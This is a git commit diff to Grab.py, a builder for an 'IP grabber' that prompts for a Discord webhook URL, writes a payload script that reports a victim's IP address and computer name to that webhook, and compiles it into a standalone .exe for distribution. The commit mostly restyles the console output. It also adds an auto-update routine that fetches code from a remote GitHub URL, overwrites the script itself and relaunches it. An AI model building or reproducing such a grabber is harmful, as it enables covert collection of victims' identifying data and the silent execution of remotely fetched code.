c54a0aed1196c8616de6b3dbc16d6426e3184f35
Pierre Henry <toopicogaming@gmail.com>
2023-03-04 22:06:13 +0300

    Changed style

--- Grab.py
+++ Grab.py
@@ -2,28 +2,52 @@ from colorama import init, Fore
 import time
 import os
 import shutil
+import ctypes
+import requests
+
+from pystyle import Colors, Colorate, Write, Center, Box
 
 
+__version__ = "2.0"
 os.system('cls')
-init(convert=True)
+ctypes.windll.kernel32.SetConsoleTitleW("IP Grabber | by . pierro | v" + __version__)
 
+class AutoUpdate: #credit to K.Dot for this shit
+    def __init__(self):
+        self.code = (
+            "https://raw.githubusercontent.com/ICExFS/IPGrabber/main/Grab.py"
+        )
+        self.update()
+
+    def update(self):
+        code = requests.get(self.code, timeout=10).text
+        with open(__file__, "r", encoding="utf-8") as f:
+            main_code = f.read()
+        if code != main_code:
+            with open(__file__, "w", encoding="utf-8") as f:
+                f.write(code)
+            os.startfile(__file__)
+            os._exit(0)
+                
 
 def main():
     os.system('cls')
-    print(Fore.LIGHTYELLOW_EX)
-    print('    /$$$$$$ /$$$$$$$')
-    print('    |_  $$_/| $$__  $$')
-    print(f'      | $$  | $$  \ $$     {Fore.YELLOW}Made by {Fore.LIGHTRED_EX}. pierro {Fore.LIGHTYELLOW_EX}')
-    print('      | $$  | $$$$$$$/')
-    print('      | $$  | $$____/') 
-    print('      | $$  | $$')      
-    print('     /$$$$$$| $$')      
-    print('    |______/|__/')      
-    print('')
-    wbh_url = input(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Enter your WebHook URL :: {Fore.YELLOW}')
-    fh_name = input(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Enter your file\'s output name (no space) :: {Fore.YELLOW}')
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Creating Main File ... ')   
-    
+    banner = """
+/$$$$$$ /$$$$$$$
+|_  $$_/| $$__  $$
+  | $$  | $$  \ $$
+  | $$  | $$$$$$$/
+  | $$  | $$____/
+  | $$  | $$
+ /$$$$$$| $$
+|______/|__/
+"""
+    print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(banner), 1))
+    print(Colorate.Horizontal(Colors.green_to_blue, Box.Lines("made by . pierro")))
+    print('\n')
+    wbh_url = Write.Input("    .$ Enter your WebHook url -> ", Colors.red_to_purple, interval=0.025)
+    fh_name = Write.Input("    .$ Enter your file output name -> ", Colors.red_to_purple, interval=0.0025)
+
     
     rm = f"""
 import requests
@@ -44,25 +68,27 @@ hook.send(c + "'s IP: " + rct)
     with open(f"{fh_name}.py", "w") as f:
         f.write(rm)
     
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Main File Created')
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Compiling | Please wait ...')      
+    print(Colorate.Horizontal(Colors.green_to_blue, "    .$ Main File Created", 1))
+    print('\n')
+    print(Colorate.Horizontal(Colors.rainbow, "    .$ Compiling | Please wait ...", 1)) 
         
     os.system('echo off')
     print(Fore.BLACK)   
     os.system(f'pyinstaller --onefile --icon=Ass/Logo.ico {fh_name}.py')
     os.system('cls')
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Successfuly Compiled')   
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Deleting Unused Files/Directory')   
-    os.rename(f'dist/{fh_name}.exe',f'{fh_name}') 
+    print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))   
+    print('\n')
+    print(Colorate.Horizontal(Colors.yellow_to_green, "    .$ Deleting Unused Files/Directory | Please wait ...", 1)) 
+    os.rename(f'dist/{fh_name}.exe',f'{fh_name}.exe') 
     os.remove(f"{fh_name}.spec")
-    os.remove(f"{fh_name}")
+    os.remove(f"{fh_name}.py")
     os.rmdir("dist")
     shutil.rmtree("__pycache__")
     shutil.rmtree("build")
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Successfuly Deleted Unused Files/Directory')   
-    print('')
-    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Grabber Successfuly Created')   
+    print(Colorate.Horizontal(Colors.yellow_to_green, "    .$ Successfuly Deleted Unused Files/Directory", 1)) 
+    print(Colorate.Horizontal(Colors.red_to_purple, "    .$ Graber compiled", 1)) 
     time.sleep(2)
-    
+ 
+AutoUpdate()   
 main()
 time.sleep(100)
